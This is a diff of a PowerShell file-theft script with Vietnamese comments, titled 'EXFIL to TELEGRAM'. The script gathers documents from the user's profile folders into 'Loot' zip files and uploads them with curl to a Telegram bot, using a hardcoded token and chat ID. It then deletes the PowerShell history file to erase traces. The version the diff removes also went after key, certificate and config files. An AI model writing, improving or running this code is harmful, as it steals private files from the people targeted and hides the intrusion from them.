@@ -1,71 +1,80 @@
-$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
-$URL='https://api.telegram.org/bot{0}' -f $Token 
-
-$Path = "Downloads"
-$FileType = "pdf"
-
-while($chatID.length -eq 0){
-$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
-if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
-if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
-Sleep 10
-}
+<# 
+============================================ EXFIL to TELEGRAM (FINAL) =========================================
+#>
+# Khai báo thông tin cố định để chạy nhanh nhất có thể
+$Token  = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
+$ChatID = "8312702210"
+$URL    = "https://api.telegram.org/bot$Token"
 
 Function Exfiltrate {
+    param (
+        [string[]]$FileType = "pdf", 
+        [string[]]$Path = "Downloads"
+    )
 
-param ([string[]]$FileType,[string[]]$Path)
-$maxZipFileSize = 50MB
-$currentZipSize = 0
-$index = 1
-$zipFilePath ="$env:temp/Loot$index.zip"
-$MessageToSend = New-Object psobject 
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value "$env:COMPUTERNAME : Exfiltration Started." -Force
-irm -Method Post -Uri ($URL +'/sendMessage') -Body ($MessageToSend | ConvertTo-Json) -ContentType "application/json"
+    $maxZipFileSize = 45MB # Telegram giới hạn 50MB, để 45MB cho an toàn
+    $currentZipSize = 0
+    $index = 1
+    $zipFilePath = "$env:TEMP\Loot$index.zip"
 
-If($Path -ne $null){
-$foldersToSearch = "$env:USERPROFILE\"+$Path
-}else{
-$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
-}
+    # Thông báo bắt đầu (Dùng irm cho gọn)
+    $msgBody = @{ chat_id = $ChatID; text = "🚀 $env:COMPUTERNAME : Bat dau thu thap file..." }
+    Invoke-RestMethod -Method Post -Uri "$URL/sendMessage" -Body ($msgBody | ConvertTo-Json) -ContentType "application/json"
 
-If($FileType -ne $null){
-$fileExtensions = "*."+$FileType
-}else {
-$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-}
+    # Xử lý đường dẫn (Sửa lỗi Array to String của Join-Path)
+    if($Path){
+        $foldersToSearch = $Path | ForEach-Object { Join-Path $env:USERPROFILE $_ }
+    } else {
+        $foldersToSearch = @(Join-Path $env:USERPROFILE "Documents", Join-Path $env:USERPROFILE "Downloads")
+    }
 
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-$escmsg = "Files from : "+$env:COMPUTERNAME
+    # Xử lý định dạng file
+    $fileExtensions = if($FileType) { $FileType | ForEach-Object { "*.$_" } } else { "*.pdf" }
 
-foreach ($folder in $foldersToSearch) {
-    foreach ($extension in $fileExtensions) {
-        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
-        foreach ($file in $files) {
-            $fileSize = $file.Length
-            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
-                $zipArchive.Dispose()
-                $currentZipSize = 0
-                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-                Remove-Item -Path $zipFilePath -Force
-                Sleep 1
-                $index++
-                $zipFilePath ="$env:temp/Loot$index.zip"
-                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    if (Test-Path $zipFilePath) { Remove-Item $zipFilePath -Force }
+    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+
+    foreach ($folder in $foldersToSearch) {
+        if (!(Test-Path $folder)) { continue }
+        foreach ($extension in $fileExtensions) {
+            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                try {
+                    # Nếu thêm file này vào sẽ quá dung lượng -> Gửi và tạo file Zip mới
+                    if ($currentZipSize + $file.Length -gt $maxZipFileSize) {
+                        $zipArchive.Dispose()
+                        curl.exe -X POST "$URL/sendDocument" -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
+                        Remove-Item $zipFilePath -Force
+                        $index++
+                        $currentZipSize = 0
+                        $zipFilePath = "$env:TEMP\Loot$index.zip"
+                        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+                    }
+
+                    # Tạo Entry trong Zip
+                    $entryName = $file.FullName.Replace($folder, "").TrimStart("\")
+                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+                    $currentZipSize += $file.Length
+                } catch { continue }
             }
-            $entryName = $file.FullName.Substring($folder.Length + 1)
-            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
-            $currentZipSize += $fileSize
         }
     }
-}
-$zipArchive.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
-Remove-Item -Path $zipFilePath -Force
-Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
+
+    # Gửi phần còn lại
+    $zipArchive.Dispose()
+    if (Test-Path $zipFilePath) {
+        if ((Get-Item $zipFilePath).Length -gt 22) {
+            curl.exe -X POST "$URL/sendDocument" -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
+        }
+        Remove-Item $zipFilePath -Force
+    }
+
+    Write-Output "Done."
 }
 
+# Thực thi hàm
+Exfiltrate -FileType "pdf" -Path "Downloads"
 
-# Define What you want to search for (examples at the top)
-Exfiltrate
+# Xóa dấu vết
+Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
